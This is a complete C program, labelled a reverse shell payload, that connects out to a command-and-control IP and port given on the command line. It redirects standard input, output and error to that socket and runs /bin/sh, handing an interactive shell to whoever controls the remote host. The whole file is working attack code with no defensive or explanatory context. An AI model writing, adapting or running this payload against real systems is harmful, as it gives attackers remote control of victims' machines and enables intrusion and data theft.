#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

// Reverse shell payload
int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <c2_ip> <c2_port>\n", argv[0]);
        exit(1);
    }
    
    const char* c2_ip = argv[1];
    int c2_port = atoi(argv[2]);
    
    // Create socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("socket");
        exit(1);
    }
    
    // Configure C2 address
    struct sockaddr_in c2_addr;
    c2_addr.sin_family = AF_INET;
    c2_addr.sin_port = htons(c2_port);
    if (inet_pton(AF_INET, c2_ip, &c2_addr.sin_addr) <= 0) {
        perror("inet_pton");
        close(sock);
        exit(1);
    }
    
    // Connect to C2
    if (connect(sock, (struct sockaddr *)&c2_addr, sizeof(c2_addr)) == -1) {
        perror("connect");
        close(sock);
        exit(1);
    }
    
    // Redirect standard I/O to socket
    dup2(sock, 0); // stdin
    dup2(sock, 1); // stdout
    dup2(sock, 2); // stderr
    
    // Execute shell
    char *shell = "/bin/sh";
    char *args[] = {shell, NULL};
    execve(shell, args, NULL);
    
    // Should never reach here
    close(sock);
    return 0;
}